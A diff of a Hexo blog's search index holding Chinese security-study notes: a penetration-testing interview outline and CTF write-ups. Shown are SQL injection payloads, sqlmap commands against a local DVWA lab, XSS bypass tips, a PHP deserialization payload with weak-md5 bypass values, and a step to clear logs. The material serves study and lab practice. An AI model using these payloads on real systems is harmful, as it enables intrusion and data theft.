@@ -4,37 +4,76 @@
   
   
   <entry>
+    <title>笔试面试准备</title>
+    <link href="/2024/12/10/%E7%AC%94%E8%AF%95%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
+    <url>/2024/12/10/%E7%AC%94%E8%AF%95%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</url>
+    
+    <content type="html"><![CDATA[<p>a、信息收集<br>    1.获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。<br>        用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯  。利用已有信息生成专用字典。<br>        查看服务器旁站及子域名站点，是否具又通用性漏洞<br>    2、查询服务器旁站以及子域名站点<br>        所以先看看旁站有没有通用性的cms或者其他漏洞。<br>    3、查看服务器操作系统版本，web中间件<br>        看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>    4、查看IP，进行IP地址端口扫描<br>        对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>    5、扫描网站目录结构，<br>        可以利用Dirsearch工具，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>    6、google hack 进一步探测网站的信息，后台，敏感文件<br>b、漏洞扫描<br>    sql注入<br>        报错注入常用函数<br>            1、floor()<br>            2、updatexml(xml_doument,XPath_string,new_value)<br>                第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>                第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>                第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>                and updatexml(1,concat(0x7e,(),0x7e),1) –+一共可以接收三个参数，报错位置在第二个参数.<br>            3、extractvalue()<br>                updatexml使用三个参数，extractvalue只有两个参数。<br>                and extractvalue(1,concat(0x7e,())) –+一共可以接收两个参数，报错位置在第二个参数<br>        时间盲注<br>            时间盲注是利用sleep函数造成延时，判断是否可以进行注入，由于页面无法返回正确或错误的值，需要通过判断语句，类似布尔注入，通过if和sleep函数来逐步判断范围，需要用到的函数格式如下：<br>                <code>if（判断语句，x，y）如果判断语句正确则输出X，否则输出Y</code><br>                <code>if(1=1,1,sleep(1))，可以输入1</code><br>                <code>if(1=2,1,sleep(1))，会sleep1秒后在进行回显</code><br>        post注入：post注入是通过对输入框进行传参，可以被带入数据库进行的查询<br>            1.查询是否有注入点<br>            对输入框填入一些闭合的符号，看页面是否异常<br>            2。order by 语句查询有几个字段<br>            3.使用union 联合查询 显错点，输出点<br>            4.查询当前库名 “) union select 1,database()#<br>            5。查表名，利用当前库名查系统表<br>            <code>&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=“security” #</code><br>            6。查字段名<br>            <code>&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=“zkaq” #</code><br>            7.查表内的信息<br>            <code>&quot;)union select group_concat(flag),group_concat(zKaQ) from zkaq #         sqlmap工具使用             [SQLMap](https://so.csdn.net/so/search?q=SQLMap&amp;spm=1001.2101.3001.7020)是一款开源的渗透测试工具，它可以自动检测和利用SQL注入漏洞，并对数据库执行相应的攻击。常用的方法主要有两种，一种针对get传参扫描，一种针对post传参扫描，不同的请求扫描方式如下：                 1. get 请求: python sqlmap.py -u [http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1](http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1)                 2. post 请求：首先通过burpsuite抓包，把请求包的信息保存到文件中，通用sqlmap -r 读取请求包信息     XSS         1.反射型：与服务端交互，但是交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等         2.存储型：交互的数据会被存在数据库中，永久性存储，一般出现在留言板，注册等页面等         3.DOM型：             1..DOM xss 通过js代码操作dom文档对象模型时触发的漏洞，不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属于存储型。             2一般不与服务端进行交互         XSS防御的过滤方式：             1.JS代码前端过滤             2.输入长度的限制             3.后端逻辑通过正则匹配来过滤输入，匹配关键字输入                 1.过滤：&quot;&lt;&quot;、&quot;script&quot;、&quot;&gt;&quot;等字符         XSS绕过方式：             1.通过抓包直接，在数据包中修改发送到后端，修改前端代码的长度限制             2.通过大小写混合，复写     文件上传     CSRF         CSRF原理：         ![](../images/Pasted%20image%2020241124170412.png)         ![](../images/Pasted%20image%2020241124170432.png)         跨站请求伪造         1.当我们打开网站或者登陆某个网站后，就会产生一个会话(这里指用户登陆后)，这个会话可能是**SESSION,Cookie**控制，在会话未结束时，恶意网站利用目前的权限对网站做出相关操作，通过伪造信息通过用户的浏览器的cookie进行请求操作。         而CSRF攻击则是建立会话之上的攻击。比如当你登陆了网上银行，正在进行转账业务，这时你的某个QQ好友(攻击者)发来一条消息(URL)，这条消息是攻击者精心构造的转账业务代码。而且与你所登录的网站是同一个银行，你可能认为这个网站是安全的，并不是什么钓鱼网站之类的，然后打开了这条URL，那么你的账户的钱可能就在你的这一次小小点击上全部丢失。怎么可能这么神奇呢?其实这并不神奇。主要是因为你的浏览器正处于与此网站的会话之中，那么一些操作都是合法的，而入侵者构造的这段代码只不过是正常的转账操作代码而己。比如说你想给用户spisec转账1000元，那么点击提交按钮之后，可能会发送以下请求:             **问题1.SESSION和Cookie区别**                 **</code>Session<code>的主要作用就是通过服务端记录用户的状态。** **典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的</code>Session<code>之后就可以标识这个用户并且跟踪这个用户了。                </code>Cookie<code> 数据保存在客户端(浏览器端)，</code>Session<code>数据保存在服务器端。                 相对来说</code>Session<code>安全性更高。如果使用</code>Cookie<code>的一些敏感信息不要写入</code>Cookie<code>中，最好能将</code>Cookie&#96; 信息加密然后使用到的时候再去服务器端解密。**<br>        1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A;<br>        2，在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A;<br>        3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B;<br>        4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A;<br>        5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户c的Cookie信息以c的权限处理该请求，导致来自网站B的恶意代码被执行。<br>    代码执行<br>    命令执行<br>    越权访问<br>    目录读取<br>    任意文件读取、下载<br>    文件包含<br>    远程命令执行<br>    弱口令<br>    编辑器漏洞，<br>    暴力破解等<br>技术工具情况<br>    NMAP使用<br>    Sqlmap使用<br>c、漏洞利用<br>    利用以上的方式拿到webshell，或者其他权限<br>d、权限提升<br>    提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权<br>e、日志清理<br>f、总结报告及修复方案</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2024/12/10/BUU%20XSS%20COURSE%201%201/"/>
+    <url>/2024/12/10/BUU%20XSS%20COURSE%201%201/</url>
+    
+    <content type="html"><![CDATA[<p><img src="/../images/Pasted%20image%2020241210175215.png"><br>提交内容后提示被存储，初步想法为存储型XSS。</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2024/12/10/BUU%20BURP%20COURSE%201%201/"/>
+    <url>/2024/12/10/BUU%20BURP%20COURSE%201%201/</url>
+    
+    <content type="html"><![CDATA[<p><img src="/../images/Pasted%20image%2020241210174721.png"><br>看到本地访问，我们很自然的相到，将X-Forwarded-For设为127.0.0.1<br><img src="/../images/Pasted%20image%2020241210174858.png"><br>点击登录，还是显示只能本地访问。<br>我们尝试抓包，修改登陆时的post请求，同时加入X-Forwarded-For的值为127.0.0.1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>得到flag<br><img src="/../images/Pasted%20image%2020241210175041.png"></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title></title>
+    <link href="/2024/12/10/BUU%20UPLOAD%20COURSE%201%201/"/>
+    <url>/2024/12/10/BUU%20UPLOAD%20COURSE%201%201/</url>
+    
+    <content type="html"><![CDATA[<p>反序列化题目，题目代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Created by PhpStorm.</span><br><span class="hljs-comment"> * User: jinzhao</span><br><span class="hljs-comment"> * Date: 2019/10/6</span><br><span class="hljs-comment"> * Time: 8:04 PM</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;correct = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">uniqid</span>());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;correct === <span class="hljs-variable language_">$this</span>-&gt;input) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><span class="hljs-comment"># 以上代码为class BUU的定义，通过将`BUU`的`input` 指向`correct`的地址，然后析# 构函数的时候两个变量就相等了</span><br><br><span class="hljs-comment"># 创建了 `BUU` 类的一个实例对象 `$obj`</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> BUU;<br><span class="hljs-comment"># 将 `$obj` 对象的 `$input` 属性设置为对 `$correct` 属性的引用</span><br><span class="hljs-variable">$obj</span>-&gt;input = &amp;<span class="hljs-variable">$obj</span>-&gt;correct; <br><span class="hljs-comment"># 将这个 `BUU` 对象进行序列化并输出</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><br></code></pre></td></tr></table></figure><p>得到如下序列化数据：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;BUU&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;correct&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;input&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><ol><li><strong>“O:3:”BUU”:2:{…}” 部分</strong>：<ul><li>“O” 表示这是一个对象（Object）的序列化表示。</li><li>“3” 表示对象名称的长度，在这里对象名称是 “BUU”，长度为 3 个字符。</li><li>“2” 表示这个对象包含 2 个属性，后续花括号内就是对这 2 个属性的具体序列化描述。</li></ul></li><li><strong>“s:7:”correct”;s:0:””;” 部分</strong>：<ul><li>“s” 表示这是一个字符串（String）类型的数据。</li><li>“7” 表示属性名 “correct” 的长度为 7 个字符，后面跟着属性名 “correct” 本身。</li><li>紧接着又一个 “s”，然后 “0” 表示对应的值是一个长度为 0 的字符串（也就是空字符串），后面的双引号内就是该属性的值，这里为空。</li></ul></li><li><strong>“s:5:”input”;R:2;” 部分</strong>：<ul><li>同样先有 “s” 表示字符串类型，“5” 是属性名 “input” 的长度，后面跟着属性名 “input”。</li><li>“R” 表示引用（Reference），“2” 表示引用的是前面已经出现过的第 2 个元素（从 0 开始计数，这里就是引用了自身对象中的第 2 个属性对应的元素）。在反序列化时，会根据这个引用关系去正确还原数据结构中元素之间的关联情况。</li></ul></li></ol><p>综合来看，这条序列化数据表示了一个名为 “BUU” 的对象，该对象有两个属性，一个是名为 “correct” 的属性，其值为空字符串；另一个是名为 “input” 的属性，它引用了对象自身中另一个元素（这里应该是和整体对象结构以及相关业务逻辑下存在特定关联关系的一种表示方式，具体取决于应用场景中这个对象是如何使用和定义的）。</p><p><img src="/../images/Pasted%20image%2020241210171636.png"><br>弱md5绕过的两种方法：<br>方法1：通过科学计数法绕过，原理是php里面在做 &#x3D;&#x3D; 的时候会先把两边的类型转成一样的，因为是 0e开头，php会认为它是科学计数法，而 0的多少次方都是 0。<br>常用的绕过值有：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">QNKCDZO</span><br>s155964671a<br>s1091221200a<br></code></pre></td></tr></table></figure><p>方法2：数组绕过，原理是 md5 等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过</p><p>再次分析网页的代码，需要我们传入5个参数：’pleaseget’、’pleasepost’、’md51’、<br>‘md52’、’obj’<br><img src="/../images/Pasted%20image%2020241210172852.png"><br>根据代码逻辑可推出各个参数的值如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pleasepost</span>=<span class="hljs-number">2</span>&amp;md51=QNKCDZO&amp;md52=s155964671a&amp;obj=O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;BUU&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;correct&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;input&quot;</span>;R:<span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241210173342.png"></p><p>获得Flag<br><img src="/../images/Pasted%20image%2020241210173404.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3</span>eb7a438-d708-<span class="hljs-number">42</span>c5-ba39-<span class="hljs-number">3683692</span>bc744&#125;<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>复制</title>
+    <link href="/2024/12/10/%E5%A4%8D%E5%88%B6%201/"/>
+    <url>/2024/12/10/%E5%A4%8D%E5%88%B6%201/</url>
+    
+    <content type="html"><![CDATA[<p>poc:漏洞检测程序<br>exp:漏洞利用程序<br>常见漏洞：<br>fastjson:</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>docker使用</title>
     <link href="/2024/12/09/docker%E4%BD%BF%E7%94%A8/"/>
     <url>/2024/12/09/docker%E4%BD%BF%E7%94%A8/</url>
     
     <content type="html"><![CDATA[<h2 id="一、docker寻找镜像"><a href="#一、docker寻找镜像" class="headerlink" title="一、docker寻找镜像"></a>一、docker寻找镜像</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker search pikachu</span><br></code></pre></td></tr></table></figure><h2 id="二、拉取镜像"><a href="#二、拉取镜像" class="headerlink" title="二、拉取镜像"></a>二、拉取镜像</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull area39/pikachu<br></code></pre></td></tr></table></figure><h2 id="三、运行镜像"><a href="#三、运行镜像" class="headerlink" title="三、运行镜像"></a>三、运行镜像</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run --name piakchu -d -p <span class="hljs-number">8000</span>:<span class="hljs-number">80</span> area39/pikachu <br></code></pre></td></tr></table></figure><p>-p：指定映射端口<br>-d：后台运行<br>–name：命名</p><h2 id="四、修改安全组策略"><a href="#四、修改安全组策略" class="headerlink" title="四、修改安全组策略"></a>四、修改安全组策略</h2><p><img src="/../images/Pasted%20image%2020241209174031.png"></p>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>复制</title>
-    <link href="/2024/12/07/%E5%A4%8D%E5%88%B6%201%201/"/>
-    <url>/2024/12/07/%E5%A4%8D%E5%88%B6%201%201/</url>
-    
-    <content type="html"><![CDATA[<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">git clone root<span class="hljs-variable">@189</span>.<span class="hljs-number">1.232</span>.<span class="hljs-number">129</span><span class="hljs-symbol">:/var/repo/HexoBlog</span>.git<br></code></pre></td></tr></table></figure><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">ssh-keygen -<span class="hljs-built_in">t</span> rsa -C <span class="hljs-string">&quot;1145615744@qq.com&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>复制</title>
-    <link href="/2024/12/07/%E5%A4%8D%E5%88%B6%201/"/>
-    <url>/2024/12/07/%E5%A4%8D%E5%88%B6%201/</url>
-    
-    <content type="html"><![CDATA[<p>poc:漏洞检测程序<br>exp:漏洞利用程序<br>常见漏洞：<br>fastjson:</p>]]></content>
     
     
     
@@ -232,19 +271,6 @@
     <url>/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0/</url>
     
     <content type="html"><![CDATA[<h2 id="网站架构情况"><a href="#网站架构情况" class="headerlink" title="网站架构情况"></a>网站架构情况</h2><h3 id="1-前后端分离"><a href="#1-前后端分离" class="headerlink" title="1.前后端分离"></a>1.前后端分离</h3><p>原理:前端JS等框架，通过API传输数据<br>影响:<br>1、前端页面大部分不存在漏洞<br>2、后端管理大部分不在同域名<br>3、获得权限有可能不影响后端</p><p>渗透经验：<br>1、首先进行信息收集，找到网站后端的地址<br>2、如果找不到，通过查询前段框架的历史漏洞，查看是否存在可进入的漏洞<br>3、基本不存在常规漏洞</p><h3 id="2-Docker容器"><a href="#2-Docker容器" class="headerlink" title="2.Docker容器"></a>2.Docker容器</h3><p>原理:虚拟化技术独立磁盘空间，非真实物理环境<br>影响:攻击者虚拟空间磁盘<br>渗透docker，需要进行docker逃逸 </p><h3 id="3-静态web"><a href="#3-静态web" class="headerlink" title="3.静态web"></a>3.静态web</h3><p>原理：数据没有传输性，基本无漏洞</p><h2 id="Web架构-OSS存储-负载均衡-CDN加速-反向代理-WAF防护"><a href="#Web架构-OSS存储-负载均衡-CDN加速-反向代理-WAF防护" class="headerlink" title="Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护"></a>Web架构&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护</h2>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>笔试面试准备</title>
-    <link href="/2024/09/21/%E7%AC%94%E8%AF%95%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
-    <url>/2024/09/21/%E7%AC%94%E8%AF%95%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</url>
-    
-    <content type="html"><![CDATA[<p>a、信息收集<br>    1.获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。<br>        用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯  。利用已有信息生成专用字典。<br>        查看服务器旁站及子域名站点，是否具又通用性漏洞<br>    2、查询服务器旁站以及子域名站点<br>        所以先看看旁站有没有通用性的cms或者其他漏洞。<br>    3、查看服务器操作系统版本，web中间件<br>        看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>    4、查看IP，进行IP地址端口扫描<br>        对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>    5、扫描网站目录结构，<br>        可以利用Dirsearch工具，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>    6、google hack 进一步探测网站的信息，后台，敏感文件<br>b、漏洞扫描<br>    sql注入<br>        报错注入常用函数<br>            1、floor()<br>            2、updatexml(xml_doument,XPath_string,new_value)<br>                第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>                第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>                第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>                and updatexml(1,concat(0x7e,(),0x7e),1) –+一共可以接收三个参数，报错位置在第二个参数.<br>            3、extractvalue()<br>                updatexml使用三个参数，extractvalue只有两个参数。<br>                and extractvalue(1,concat(0x7e,())) –+一共可以接收两个参数，报错位置在第二个参数<br>        时间盲注<br>            时间盲注是利用sleep函数造成延时，判断是否可以进行注入，由于页面无法返回正确或错误的值，需要通过判断语句，类似布尔注入，通过if和sleep函数来逐步判断范围，需要用到的函数格式如下：<br>                <code>if（判断语句，x，y）如果判断语句正确则输出X，否则输出Y</code><br>                <code>if(1=1,1,sleep(1))，可以输入1</code><br>                <code>if(1=2,1,sleep(1))，会sleep1秒后在进行回显</code><br>        post注入：post注入是通过对输入框进行传参，可以被带入数据库进行的查询<br>            1.查询是否有注入点<br>            对输入框填入一些闭合的符号，看页面是否异常<br>            2。order by 语句查询有几个字段<br>            3.使用union 联合查询 显错点，输出点<br>            4.查询当前库名 “) union select 1,database()#<br>            5。查表名，利用当前库名查系统表<br>            <code>&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=“security” #</code><br>            6。查字段名<br>            <code>&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=“zkaq” #</code><br>            7.查表内的信息<br>            <code>&quot;)union select group_concat(flag),group_concat(zKaQ) from zkaq #         sqlmap工具使用             [SQLMap](https://so.csdn.net/so/search?q=SQLMap&amp;spm=1001.2101.3001.7020)是一款开源的渗透测试工具，它可以自动检测和利用SQL注入漏洞，并对数据库执行相应的攻击。常用的方法主要有两种，一种针对get传参扫描，一种针对post传参扫描，不同的请求扫描方式如下：                 1. get 请求: python sqlmap.py -u [http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1](http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1)                 2. post 请求：首先通过burpsuite抓包，把请求包的信息保存到文件中，通用sqlmap -r 读取请求包信息     XSS         1.反射型：与服务端交互，但是交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等         2.存储型：交互的数据会被存在数据库中，永久性存储，一般出现在留言板，注册等页面等         3.DOM型：             1..DOM xss 通过js代码操作dom文档对象模型时触发的漏洞，不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属于存储型。             2一般不与服务端进行交互         XSS防御的过滤方式：             1.JS代码前端过滤             2.输入长度的限制             3.后端逻辑通过正则匹配来过滤输入，匹配关键字输入                 1.过滤：&quot;&lt;&quot;、&quot;script&quot;、&quot;&gt;&quot;等字符         XSS绕过方式：             1.通过抓包直接，在数据包中修改发送到后端，修改前端代码的长度限制             2.通过大小写混合，复写     文件上传     CSRF         CSRF原理：         ![](../images/Pasted%20image%2020241124170412.png)         ![](../images/Pasted%20image%2020241124170432.png)         跨站请求伪造         1.当我们打开网站或者登陆某个网站后，就会产生一个会话(这里指用户登陆后)，这个会话可能是**SESSION,Cookie**控制，在会话未结束时，恶意网站利用目前的权限对网站做出相关操作，通过伪造信息通过用户的浏览器的cookie进行请求操作。         而CSRF攻击则是建立会话之上的攻击。比如当你登陆了网上银行，正在进行转账业务，这时你的某个QQ好友(攻击者)发来一条消息(URL)，这条消息是攻击者精心构造的转账业务代码。而且与你所登录的网站是同一个银行，你可能认为这个网站是安全的，并不是什么钓鱼网站之类的，然后打开了这条URL，那么你的账户的钱可能就在你的这一次小小点击上全部丢失。怎么可能这么神奇呢?其实这并不神奇。主要是因为你的浏览器正处于与此网站的会话之中，那么一些操作都是合法的，而入侵者构造的这段代码只不过是正常的转账操作代码而己。比如说你想给用户spisec转账1000元，那么点击提交按钮之后，可能会发送以下请求:             **问题1.SESSION和Cookie区别**                 **</code>Session<code>的主要作用就是通过服务端记录用户的状态。** **典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的</code>Session<code>之后就可以标识这个用户并且跟踪这个用户了。                </code>Cookie<code> 数据保存在客户端(浏览器端)，</code>Session<code>数据保存在服务器端。                 相对来说</code>Session<code>安全性更高。如果使用</code>Cookie<code>的一些敏感信息不要写入</code>Cookie<code>中，最好能将</code>Cookie&#96; 信息加密然后使用到的时候再去服务器端解密。**<br>        1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A;<br>        2，在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A;<br>        3.用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B;<br>        4.网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A;<br>        5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户c的Cookie信息以c的权限处理该请求，导致来自网站B的恶意代码被执行。<br>    代码执行<br>    命令执行<br>    越权访问<br>    目录读取<br>    任意文件读取、下载<br>    文件包含<br>    远程命令执行<br>    弱口令<br>    编辑器漏洞，<br>    暴力破解等<br>技术工具情况<br>    NMAP使用<br>    Sqlmap使用<br>c、漏洞利用<br>    利用以上的方式拿到webshell，或者其他权限<br>d、权限提升<br>    提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权<br>e、日志清理<br>f、总结报告及修复方案</p>]]></content>
     
     
     
